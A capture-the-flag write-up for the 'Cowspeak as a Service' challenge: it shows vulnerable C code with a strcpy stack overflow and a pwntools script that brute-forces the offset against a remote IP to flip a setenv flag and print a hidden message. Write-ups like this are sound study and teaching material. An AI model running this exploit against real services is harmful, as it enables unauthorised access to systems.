# Cowspeak as a Service (CaaS) 250pts (29 solves) #

![TASK](https://imgur.com/xNtRfrq.png)

I liked the idea of the task, we are given the source code and we have to print the first message

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void moo(char *msg)
{
        char speak[64];
        int chief_cow = 1;

        strcpy(speak, msg);
        speak[strcspn(speak, "\r\n")] = 0;
        setenv("MSG", speak, chief_cow);

        system("./cowsay $MSG");

}

int main() {
        char buf[1024];
        setbuf(stdout, NULL);
        puts("Welcome to Cowsay as a Service (CaaS)!\n");
        puts("Enter your message: \n");

        fgets(buf, 1024, stdin);
        moo(buf);

        return 0;
}

```

We can notice the buffer overflow of the speak buffer in moo function, but we won't be able here to spawn a shell and that's not the purpose of the task xd , if we
read about setenv function we can notice that if its third parameter is different than zero it will overwrite the environment variable if it already exists , and if it's equal to zero it won't overwrite it.

So the idea is clear now, we will use the BOF to make the **speak[strcspn(speak, "\r\n")] = 0;** line sets the chief_cow variable to zero.

Here is my full exploit :

```python
from pwn import *
for i in range(60,90):
        p=remote("192.241.138.174",9998)
        p.recvuntil("message:")
        payload="A"*i+"\r\n\x00"
        p.sendline(payload)
        data=p.recvuntil("""                ||     ||
""")
        if "UMD" in data :
                log.info("Fouuuuund at: "+str(i))
                print data
                break
        p.close()
```

The offset was 74 which is logic . If you have any questions you can DM on twitter @BelkahlaAhmed1 and thank you :D
